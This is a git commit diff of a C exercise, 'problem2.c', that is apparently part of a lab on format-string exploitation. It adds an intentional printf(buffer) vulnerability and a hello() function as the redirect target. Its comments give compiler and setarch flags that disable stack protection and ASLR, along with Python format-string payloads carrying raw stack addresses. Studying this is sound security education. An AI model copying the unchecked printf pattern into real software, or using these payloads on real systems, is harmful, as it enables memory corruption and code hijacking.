0132e912bc91800c0d06a7e75c30c119f76767d8
SujoyDU <debnath.sujoy@hotmail.com>
2021-05-26 17:28:54 -0400

    another try

--- problem2.c
+++ problem2.c
@@ -1,27 +1,50 @@
 #include <stdio.h>
 
 int target;
-int value;
-
-void vuln(char *string,int k)
+// int value;
+void hello() 
 {
-  printf(string);
-  if(target) {
-    printf("\nyou have changed the target \n");
-
-  }
-  if(k!=10) {
-    printf("\nyou have changed K \n");
-
-  }
-  else {
-    printf("\ntarget not changed\n");
-  }
-  printf("%d\n",k);
+  printf("code execution redirected!");
+  _exit(1);
 }
+
+// void vuln(char *string,int k)
+// {
+//   printf("in vuln address of k: %p\n", &k);
+//   printf(string);
+//   if(target) {
+//     printf("\nyou have changed the target \n");
+
+//   }
+//   if(k!=10) {
+//     printf("\nyou have changed K \n");
+
+//   }
+//   else {
+//     printf("\ntarget not changed\n");
+//   }
+//   printf("%d\n",k);
+// }
 int main(int argc, char **argv) {
-  int k = 10;
-  vuln(argv[1],k);
+  int n= 128;
+  char buffer[n];
+  fgets(buffer,n,stdin);
+  printf(buffer);
+  exit(1);
+	// scanf("%s",buffer);
+  //int a = 10;
+	// printf("%s\n",buffer);
+  // printf("memory address of a: %p\n",&a);
+  // printf(buffer);
+  // if(a !=10){
+  //   printf("changed the value of a: %d\n",a);
+  // }
+	// return 0;
+  // int k = 10;
+  // printf("address of target: %p\n", &target);
+  // printf("address of va-nlue: %p\n", &value);
+  // printf("address of k: %p\n", &k);
+  // vuln(argv[1],k);
   
   // const int n = 128;
   // char a[] = 'ABC';
@@ -63,10 +86,12 @@ int main(int argc, char **argv) {
 	return 0;
 }
 //gcc -fno-stack-protector -z exestack -o victim problem2.c 
-// setarch `arch` -R ./victim "`python -c "print '%x '*30"`"
+// setarch `arch` -R ./victim "`python -c "print 'AAAA '+'%x '*100"`"
 // "`python -c "print '%x '*10"`"
 
 //0000000000004014
 //\x14\x40\x00\x00\x00\x00\x00\x00
-//python -c "print 'AAAA '+'\x14\x40\x00\x00\x00\x00\x00\x00'+' BBBBBB'+ '%x '*300"
+//python -c "print 'AAAA '+'\xe4\xd9\xff\xff\xff\x7f'+' BBBBBB'+ '%x '*5"
 //14 40 00 00
+//7fffffffd9e4
+//a=`printf %016x 0x7fffffffd9e4 | tac -rs..`
